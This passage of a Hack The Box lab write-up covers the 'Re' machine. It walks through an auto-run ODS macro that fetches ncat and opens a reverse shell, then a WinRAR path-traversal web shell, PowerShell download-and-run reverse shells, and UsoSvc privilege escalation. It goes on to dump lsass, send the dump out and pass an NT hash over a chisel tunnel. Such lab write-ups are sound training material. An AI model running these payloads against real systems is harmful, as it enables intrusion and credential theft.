+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>This will create a new module. Give it a name and you will be dropped into the
+editor. To test for basic command execution I first added a simple pingback
+payload: &ldquo;<code>ping -n 1 10.10.15.130</code>&rdquo;:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/23_htb_re/05_ods_create_macro_3.jpg"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Create pingback macro</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Now save the file (I named it &ldquo;pingback.ods&rdquo;), then close the macro editor.
+Then open &ldquo;Tools&rdquo;, &ldquo;Customize&rdquo;, select the &ldquo;Open Document&rdquo; event, and select
+your module&rsquo;s Main function. Then hit &ldquo;OK&rdquo;:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/23_htb_re/06_ods_create_macro_4.jpg"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Configure macro to execute when document is opened</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>This was it and I was ready to test the file. I uploaded it to the malware
+dropbox and waited for a ping, which arrived after only a few seconds:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/23_htb_re/07_pingback_success.jpg"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Receiving a ping from the macro</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>I went on to get a reverse shell using the following payload:</p>
+<pre><code>Shell(&quot;certutil.exe -urlcache -split -f 'http://10.10.15.130/ncat.exe' 'C:\Windows\Temp\ncat.exe'&quot;)
+Shell(&quot;C:\Windows\Temp\ncat.exe --ssl -e cmd.exe 10.10.15.130 9001&quot;)
+</code></pre>
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/23_htb_re/08_revshell_success.jpg"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Reverse ncat shell as luke</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>The trick probably was that the macro does not use &ldquo;<code>cmd.exe</code>&rdquo; or &ldquo;<code>powershell.exe</code>&rdquo;.
+Instead it just calls programs directly. I had no luck with any cmd or
+PowerShell payloads.</p>
+<h2 id="malicious-rar-file">Malicious RAR file</h2>
+<h3 id="discovering-the-winrar-vulnerability">Discovering the WinRAR vulnerability</h3>
+<p>In &ldquo;<code>C:\Users\luke\Documents</code>&rdquo; I found a file &ldquo;<code>process_samples.ps1</code>&rdquo; that
+seemed to be responsible for processing the uploads:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$process_dir = <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">C:\Users\luke\Documents\malware_process</span><span style="color:#e6db74">&#34;</span>
+$files_to_analyze = <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">C:\Users\luke\Documents\ods</span><span style="color:#e6db74">&#34;</span>
+$yara = <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">C:\Users\luke\Documents\yara64.exe</span><span style="color:#e6db74">&#34;</span>
+$rule = <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">C:\Users\luke\Documents\ods.yara</span><span style="color:#e6db74">&#34;</span>
+
+<span style="color:#66d9ef">while</span>($true) {
+        <span style="color:#75715e"># Get new samples</span>
+        move C:\Users\luke\Documents\malware_dropbox\* $process_dir
+
+        <span style="color:#75715e"># copy each ods to zip file</span>
+        Get-ChildItem $process_dir -Filter *.ods |
+        Copy-Item -Destination {$_.fullname <span style="color:#f92672">-replace</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">.ods</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">.zip</span><span style="color:#e6db74">&#34;</span>}
+
+        Get-ChildItem $process_dir -Filter *.zip | <span style="color:#66d9ef">ForEach</span>-Object {
+
+                <span style="color:#75715e"># unzip archive to get access to content</span>
+                $unzipdir = Join-Path $_.directory $_.Basename
+                New-Item -Force -ItemType directory -Path $unzipdir | Out-Null
+                Expand-Archive $_.fullname -Force -ErrorAction SilentlyContinue -DestinationPath $unzipdir
+
+                <span style="color:#75715e"># yara to look for known malware</span>
+                $yara_out = &amp; $yara -r $rule $unzipdir
+                $ods_name = $_.fullname <span style="color:#f92672">-replace</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">.zip</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">.ods</span><span style="color:#e6db74">&#34;</span>
+                <span style="color:#66d9ef">if</span> ($yara_out.length <span style="color:#f92672">-gt</span> 0) {
+                        Remove-Item $ods_name
+                }
+        }
+
+
+        <span style="color:#75715e"># if any ods files left, make sure they launch, and then archive:</span>
+        $files = ls $process_dir\*.ods
+        <span style="color:#66d9ef">if</span> ( $files.length <span style="color:#f92672">-gt</span> 0) {
+                <span style="color:#75715e"># launch ods files</span>
+                Invoke-Item <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">C:\Users\luke\Documents\malware_process\*.ods</span><span style="color:#e6db74">&#34;</span>
+                Start-Sleep -s 5
+
+                <span style="color:#75715e"># kill open office, sleep</span>
+                Stop-Process -Name soffice*
+                Start-Sleep -s 5
+
+                <span style="color:#75715e">#&amp; &#39;C:\Program Files (x86)\WinRAR\Rar.exe&#39; a -ep $process_dir\temp.rar $process_dir\*.ods 2&gt;&amp;1 | Out-Null</span>
+                Compress-Archive -Path <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">$</span><span style="color:#e6db74">process_dir\*.ods</span><span style="color:#e6db74">&#34;</span> -DestinationPath <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">$</span><span style="color:#e6db74">process_dir\temp.zip</span><span style="color:#e6db74">&#34;</span>
+                $hash = (Get-FileHash -Algorithm MD5 $process_dir\temp.zip).hash
+                <span style="color:#75715e"># Upstream processing may expect rars. Rename to .rar</span>
+                Move-Item -Force -Path $process_dir\temp.zip -Destination $files_to_analyze\$hash.rar
+        }
+
+        Remove-Item -Recurse -force -Path $process_dir\*
+        Start-Sleep -s 5
+}
+</code></pre></div><p>It basically grabs all uploaded documents, unzips them, runs Yara on them and
+deletes all files that match, then launches all ODS files that are left.
+In the end it creates a RAR archive. The comment is a hint that some
+downstream processing would happen to it.
+These files are written to &ldquo;<code>C:\Users\luke\Documents\ods</code>&rdquo;.</p>
+<p>I found an empty folder at &ldquo;<code>C:\Program Files (x86)\WinRAR</code>&rdquo; but an installer
+was still left in &ldquo;<code>C:\Users\luke\Downloads</code>&rdquo;, which indicated the version may
+be 5.50 beta 1. Searching for exploits brought up path traversal / RCE exploits
+for WinRAR 5.61, which may apply:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/23_htb_re/09_winrar_exploit.jpg"  />
+    
+  
+  
+  <figcaption>
+    <header><b>WinRAR 5.50 installer and exploits</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<h3 id="exploiting-winrar">Exploiting WinRAR</h3>
+<p>A publicly available exploit is on
+<a href="https://github.com/manulqwerty/Evil-WinRAR-Gen">github.com/manulqwerty/Evil-WinRAR-Gen</a>.
+It claims to be an RCE since you can write stuff to the startup folder with it.
+On HTB the machine will not be rebooted so we need a better idea, like
+writing a web shell into one of the web directories the current user has no
+access to.</p>
+<p>I grabbed a shell from &ldquo;<code>/usr/share/nishang/Antak-WebShell/antak.aspx</code>&rdquo;
+and created the RAR file with
+&ldquo;<code>opt/Evil-WinRAR-Gen/evilWinRAR.py -o evil.rar -e FY7JGAlO4a9YVcCdFwk5mHSK.aspx -g harmless.txt -p '\inetpub\wwwroot\re\'</code>&rdquo;.
+For some reason it needs a harmless file, which can contain anything.
+A simple download to &ldquo;<code>C:\Users\luke\Documents\ods</code>&rdquo; triggered processing and
+the file disappeared shortly after the download:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/23_htb_re/10_evilrar_upload.jpg"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Creating and uploading an evil RAR file</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>I was then able to access the webshell:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/23_htb_re/11_webshell_re.jpg"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Using the web shell as user re</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<h3 id="upgrading-the-shell">Upgrading the shell</h3>
+<p>A web shell is nice but a reverse shell is better.
+To do it I used
+<a href="https://github.com/besimorhino/powercat">github.com/besimorhino/powercat</a>.
+I downloaded &ldquo;<code>powercat.ps1</code>&rdquo;, appended &ldquo;<code>powercat -c 10.10.15.130 -p 443 -ep</code>&rdquo;
+to make it send a Powershell reverse shell back. After setting up a listener
+with &ldquo;<code>nc -lnvp 443</code>&rdquo; I executed the following command through the web shell:
+&ldquo;<code>IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.15.130/powercat.ps1')</code>&rdquo;:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/23_htb_re/12_reverse_shell_re.jpg"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Upgrading to reverse shell</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>The result was a reverse shell, running as user &ldquo;<code>apppool\re</code>&rdquo;, and with full
+PowerShell support.</p>
+<h2 id="abusing-usosvc-service">Abusing UsoSvc Service</h2>
+<h3 id="discovering-the-service">Discovering the service</h3>
+<p>I grabbed a copy of
+<a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1">PowerUp.ps1</a>
+and ran all checks. It brought up 2 findings, one of which was a vulnerable
+service called UsoSvc which I could abuse to execute code as SYSTEM.</p>
+<pre><code>PS C:\windows\system32\inetsrv&gt; IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.15.130/PowerUp.ps1')
+PS C:\windows\system32\inetsrv&gt; Invoke-AllChecks
+
+
+Privilege   : SeImpersonatePrivilege
+Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+TokenHandle : 2100
+ProcessId   : 2460
+Name        : 2460
+Check       : Process Token Privileges
+
+ServiceName   : UsoSvc
+Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
+StartName     : LocalSystem
+AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
+CanRestart    : True
+Name          : UsoSvc
+Check         : Modifiable Services
+</code></pre><p>If PowerUp would have been blocked you could have identified the service with
+<a href="https://live.sysinternals.com/">accesschk.exe</a> from SysInternals. Transfer it
+to the box, then check your groups. For each, you can ask accesschk for your
+permissions:</p>
+<pre><code>PS C:\Users\Public\Documents&gt; whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                           Type             SID          Attributes
+==================================== ================ ============ ==================================================
+Mandatory Label\High Mandatory Level Label            S-1-16-12288
+Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
+LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+                                     Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group
+PS C:\Users\Public\Documents&gt; .\accesschk.exe -uwcqv &quot;NT AUTHORITY\SERVICE&quot; * /accepteula
+
+Accesschk v6.12 - Reports effective permissions for securable objects
+Copyright (C) 2006-2017 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+RW UsoSvc
+        SERVICE_ALL_ACCESS
+</code></pre><h3 id="exploitation-the-access">Exploitation the access</h3>
+<p>Now it was easy to a reverse shell as SYSTEM. I simply reconfigured the service
+to send me one. Note that I used
+&ldquo;<code>cmd /c start C:\Users\Public\Documents\ncat.exe --ssl -e cmd 10.10.15.130 8001</code>&rdquo;
+so that ncat gets started in a
+<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/start">separate command prompt in cmd</a>,
+which ensures it is not killed. Otherwise, since ncat does not implement the
+Windows Service API, it would get killed shortly after launch.</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/23_htb_re/13_servie_abuse.jpg"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Abusing UsoSvc to get a reverse shell as SYSTEM</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<h2 id="pivoting-to-coby">Pivoting to coby</h2>
+<p>Apparently SYSTEM cannot read the flag because it is encrypted. After a short
+moment of WTF I learned it was due to the flag being encrypted by EFS.
+This can be check with &ldquo;<code>cipher /c &lt;file&gt;</code>&rdquo;:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/23_htb_re/14_no_flag_for_system.jpg"  />
+    
+  
+  
+  <figcaption>
+    <header><b>SYSTEM cannot read the flag</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>There is a <a href="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files">mimikatz guide</a>
+to decrypt such files. However, I got some errors when using mimikatz on the box,
+got frustrated and looked for other ways.</p>
+<p>Good old SysInternals to the rescue, I ran
+<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">procdump</a>
+and waited a long time to get the memory dump of lsass to my system. To dump it I ran
+<code>procdump64.exe -accepteula -64 -ma lsass.exe lsass.dmp</code>.
+I then copied over the dump with netcat. Locally I listened with &ldquo;<code>nc --ssl -lnvp 8005 &gt; lsass.dmp</code>&rdquo;,
+then started the file transfer from the box with
+&ldquo;<code>ncat.exe --ssl -i 5 10.10.15.130 8005 &lt; lsass.dmp</code>&rdquo;. 89 MB took a while but in
+the end it worked:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/23_htb_re/16_copy_lsass_dump.jpg"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Transfer dump with ncat</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Locally I now ran &ldquo;<code>pypykatz lsa minidump lsass.dmp</code>&rdquo; to dump the hashes.
+I got the NT hash of coby (&ldquo;<code>fa88e03e41fdf7b707979c50d57c06cf</code>&rdquo;):</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/23_htb_re/17_pypykatz_coby_hash.jpg"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Extracting the hash of coby</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Now I had to access the host as this user in some way. Attempts to use psexec
+were not successful (frustration again). However, I noticed the box listens on 5985, but the port
+was firewalled. I uploaded <a href="https://github.com/jpillora/chisel">github.com/jpillora/chisel</a>
+to the box to forward the port (standalone Golang tool you can easily
+cross-compile for Windows).
+Locally I launched the server with &ldquo;<code>./chisel server -p 8989 --reverse</code>&rdquo;,
+then I connected the client from the target box with
+&ldquo;<code>./chisel.exe client 10.10.15.130:8989 R:5985:127.0.0.1:5985</code>&rdquo;.</p>
+<p>With these preparations I was able to connect with
+<a href="https://github.com/Hackplayers/evil-winrm">github.com/Hackplayers/evil-winrm</a>,
+passing the hash for coby:
+&ldquo;<code>./evil-winrm.rb  -i 127.0.0.1 -u coby -H fa88e03e41fdf7b707979c50d57c06cf</code>&rdquo;.
+Now the flag was finally readable:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/23_htb_re/18_winrm_shell_flag.jpg"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Port forwarding to get a WinRM shell</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<h3 id="meterpreter-and-incognito">Meterpreter and Incognito</h3>
+<p>If WinRM would not have been available Meterpreter would have been the way to
+go. It can be used to run the
+<a href="https://www.offensive-security.com/metasploit-unleashed/fun-incognito/">incognito module</a>,
+which allows to impersonate other users. As SYSTEM, you can impersonate
+anybody. Thus I could use it to become coby and read the flag.</p>
+<p>To get meterpreter, I used
+&ldquo;<code>msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.15.130 LPORT=443 -f exe -o /tmp/www/msf.exe</code>&rdquo;
+to generate an executable, transfered it to the box and started it using
+UsoSvc.
+Locally I ran a handler and got the session. This was all I needed to become
+coby and get the flag:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/23_htb_re/15_impersonate_coby.jpg"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Impersonating coby to read the flag</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://0xdf.gitlab.io/2020/02/01/htb-re.html">0xdf writeup</a>:
+excellent information first-hand from the creator of the box.</li>
+<li><a href="https://snowscan.io/htb-writeup-re/#">snowscan writeup</a>: straightforward
+solution, also going an unintended way.</li>
+<li><a href="https://medium.com/@hussaini.faisal/hackthebox-writeup-re-f4ff34c23a70">another writeup</a>:
+shows you how to prepare the evil macro without LibreOffice.</li>
+</ul>
+
+    </div>
+    
+    <footer>
+      <hr>
+      <p>
+  Published
+  
+    
+      by <span itemprop="author">Dominic Breuker</span>
+    
+  
+  <time itemprop="datePublished" datetime="2020-02-21T00:00:00&#43;01:00">
+    21 Feb, 2020
+  </time>
+  
+    in <span itemprop="articleSection"><a href="/categories/hackthebox/">hackthebox</a></span>
+  
+  
+    and tagged <a href="/tags/ctf/">ctf</a>, <a href="/tags/hackthebox/">hackthebox</a>, <a href="/tags/infosec/">infosec</a> and <a href="/tags/write-up/">write-up</a>
+  
+  using <span itemprop="wordCount">2336</span> words.
+</p>
+
+      
+
+
+  <aside>
+    <header>Related Content</header>
+    <ul>
+      
+        <li><a href="/post/htb_carrier/">Hack The Box Write-up - Carrier</a>
+        <time datetime="25M">25 minutes</time>
+      
+        <li><a href="/post/htb_access/">Hack The Box Write-up - Access</a>
+        <time datetime="11M">11 minutes</time>
+      
+        <li><a href="/post/htb_active/">Hack The Box Write-up - Active</a>
+        <time datetime="12M">12 minutes</time>
+      
+        <li><a href="/post/htb_dropzone/">Hack The Box Write-up - Dropzone</a>
+        <time datetime="10M">10 minutes</time>
+      
+        <li><a href="/post/htb_devoops/">Hack The Box Write-up - DevOops</a>
+        <time datetime="7M">7 minutes</time>
+      
+        <li><a href="/post/htb_sunday/">Hack The Box Write-up - Sunday</a>
+        <time datetime="8M">8 minutes</time>
+      
+        <li><a href="/post/htb_solidstate/">Hack The Box Write-up - SolidState</a>
+        <time datetime="12M">12 minutes</time>
+      
+    </ul>
+  </aside>
+
+
+    </footer>
+  </article>
+</main>
+    <footer>
+  
+
+</footer>
+  </body>
+</html>
